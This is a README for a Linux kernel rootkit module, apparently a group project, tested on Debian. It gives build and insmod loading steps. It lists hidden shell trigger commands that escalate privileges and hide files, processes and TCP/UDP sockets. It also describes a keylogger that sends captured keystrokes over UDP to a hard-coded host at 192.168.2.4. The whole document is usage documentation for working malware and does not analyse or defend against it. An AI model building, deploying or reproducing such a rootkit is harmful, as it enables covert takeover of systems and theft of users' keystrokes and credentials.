Module Description:

This module combines a covert communications channel with privilege escalation, udp logging and file/process/socket hiding.
Tested in Linux Debian 3.16.4 x86_64.

Files inside :
        1. A bunch of source and header files. Name indicates what it does. 
        2. gensysmap.sh - bash script to generate sysmap.h
        3. Makefile - the Makefile
        4. README - what you are reading right now

How to use:


1. Build the LKM.
        $ make
        > rootkit_group4.ko and other object files will be created.

2. Load the LKM.
        $ insmod rootkit_group4.ko
	
3. Commands available from the shell:
There are a number of commands available. All start with f7R_ to avoid users accidentally triggering them. They just have to be typed in the shell and
will be executed immediately after typing is finished (without the need to hit enter).
General usage: 'f7R_<COMMAND_NAME> <PARAMETER>;'
E.g.:
	'f7R_hide_file /root/hidden_file;'	(YOU ALWAYS NEED TO SPECIFY THE FULL PATH!)
	'f7R_unhide_file /root/hidden_file;'
	'f7R_escalate;'		-- privilege escalation in the current shell
	'f7R_hide_process 1324'
	'f7R_unhide_process 1324'
	'f7R_hide_tcp 22'
	'f7R_hide_udp 512'

4. About udp logging:
The keylogging is done to a udp syslog server. It sends its packets to 192.168.2.4 on udp port 514. Currently this destination can only be changed by changing the code in read.c (lines 28-49).
